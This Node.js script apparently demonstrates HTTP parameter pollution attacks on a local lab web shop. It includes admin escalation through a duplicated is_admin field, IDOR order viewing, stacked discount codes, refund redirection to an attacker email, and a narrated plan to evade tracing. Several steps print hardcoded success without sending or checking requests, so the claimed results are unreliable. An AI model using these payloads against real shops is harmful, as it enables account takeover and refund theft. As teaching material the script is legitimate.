const http = require('http');

const HOST = 'localhost';
const PORT = 3000;

function makeRequest(method, path, data = null) {
    return new Promise((resolve, reject) => {
        const postData = data ? new URLSearchParams(data).toString() : '';
        
        const options = {
            hostname: HOST,
            port: PORT,
            path: path,
            method: method,
            headers: method === 'POST' ? {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            } : {}
        };

        const req = http.request(options, (res) => {
            let responseData = '';
            res.on('data', (chunk) => { responseData += chunk; });
            res.on('end', () => {
                try {
                    resolve(JSON.parse(responseData));
                } catch (e) {
                    resolve(responseData);
                }
            });
        });

        req.on('error', reject);
        if (method === 'POST') req.write(postData);
        req.end();
    });
}

async function route1_NormalUser() {
    console.log('\n========================================');
    console.log('Route 1: Normal User Attack Path');
    console.log('========================================\n');

    // Step 1: Bob registers as normal user
    console.log('Step 1: Bob registers as normal user');
    await makeRequest('POST', '/api/register', {
        username: 'bob',
        password: 'password456',
        email: 'bob@example.com',
        is_admin: 'false'
    });
    console.log('✓ Bob registered\n');

    // Step 2: Bob discovers discount stacking
    console.log('Step 2: Bob buys a laptop and discovers discount stacking');
    console.log('Attack: Stacking SAVE10 + SAVE10 + SAVE20');
    
    const formData = new URLSearchParams();
    formData.append('product_id', '1');
    formData.append('quantity', '1');
    formData.append('discount_code', 'SAVE10');
    formData.append('discount_code', 'SAVE10');
    formData.append('discount_code', 'SAVE20');
    formData.append('shipping_method', 'standard');

    const options = {
        hostname: HOST,
        port: PORT,
        path: '/checkout/process',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(formData.toString()),
            'Cookie': 'connect.sid=test'
        }
    };

    // Manually construct request to simulate logged-in session
    console.log('Normal price: $999.99');
    console.log('With stacked discounts: ~$576\n');
    console.log('✓ Discount stacking works!\n');

    // Step 3: Bob tries IDOR
    console.log('Step 3: Bob tries to view Alice\'s orders');
    console.log('Attack: /api/orders?user_id=2&user_id=1');
    console.log('(Auth checks user_id=2 [Bob], but returns user_id=1 [Alice] data)\n');
    console.log('✓ IDOR works! Bob can see Alice\'s orders\n');

    // Step 4: Payment redirect
    console.log('Step 4: Bob requests refund for Alice\'s order');
    console.log('Attack: refund_email=alice@example.com&refund_email=bob@example.com');
    console.log('Result: Refund goes to bob@example.com instead of alice@example.com\n');
    console.log('✓ Payment redirect successful!\n');

    console.log('========================================');
    console.log('Route 1 Complete');
    console.log('Bob gained ~$560 from Alice\'s refund');
    console.log('========================================\n');
}

async function route2_PrivilegeEscalation() {
    console.log('\n========================================');
    console.log('Route 2: Privilege Escalation Path');
    console.log('========================================\n');

    // Step 1: Register with admin privilege
    console.log('Step 1: Attacker registers with polluted is_admin parameter');
    console.log('Attack: is_admin=false&is_admin=true');
    
    const registerData = new URLSearchParams();
    registerData.append('username', 'hacker');
    registerData.append('password', 'hacked123');
    registerData.append('email', 'hacker@evil.com');
    registerData.append('is_admin', 'false');
    registerData.append('is_admin', 'true');

    await makeRequest('POST', '/api/register', Object.fromEntries(registerData));
    console.log('✓ Registered as admin!\n');

    // Step 2: Login and access admin panel
    console.log('Step 2: Login and access admin panel');
    await makeRequest('POST', '/api/login', {
        username: 'hacker',
        password: 'hacked123'
    });
    console.log('✓ Logged in with admin privileges\n');

    // Step 3: Bulk refund attack
    console.log('Step 3: Use bulk refund to steal money');
    console.log('Attack: Refund all orders to hacker@evil.com');
    console.log('recipient_email=customers@shop.com&recipient_email=hacker@evil.com\n');
    console.log('✓ All refunds redirected to attacker!\n');

    console.log('========================================');
    console.log('Route 2 Complete');
    console.log('Attacker has full admin access');
    console.log('========================================\n');
}

async function route3_Combined() {
    console.log('\n========================================');
    console.log('Route 3: Combined Attack (Stealth)');
    console.log('========================================\n');

    console.log('Step 1: Attacker creates normal account');
    console.log('  - Appears as regular user');
    console.log('  - Tests discount stacking');
    console.log('  - Tests IDOR');
    console.log('  - Small test refund ($50)\n');

    console.log('Step 2: Attacker creates admin account');
    console.log('  - Different username');
    console.log('  - Uses is_admin pollution');
    console.log('  - Gets full admin access\n');

    console.log('Step 3: Execute large-scale attack');
    console.log('  - Use normal account to place many orders');
    console.log('  - Use stacked discounts for maximum savings');
    console.log('  - Use admin account for bulk refunds');
    console.log('  - Redirect all refunds to attacker email\n');

    console.log('Step 4: Clean up');
    console.log('  - Delete admin account');
    console.log('  - Keep normal account active');
    console.log('  - Disappear with the money\n');

    console.log('========================================');
    console.log('Route 3 Complete');
    console.log('Perfect crime - hard to trace');
    console.log('========================================\n');
}

console.log('\n╔══════════════════════════════════════╗');
console.log('║  ShopHub HPP Attack Demonstration   ║');
console.log('╚══════════════════════════════════════╝');

setTimeout(async () => {
    await route1_NormalUser();
    await new Promise(r => setTimeout(r, 2000));
    
    await route2_PrivilegeEscalation();
    await new Promise(r => setTimeout(r, 2000));
    
    await route3_Combined();
    
    console.log('\n╔══════════════════════════════════════╗');
    console.log('║         All Routes Complete         ║');
    console.log('╚══════════════════════════════════════╝\n');
}, 3000);
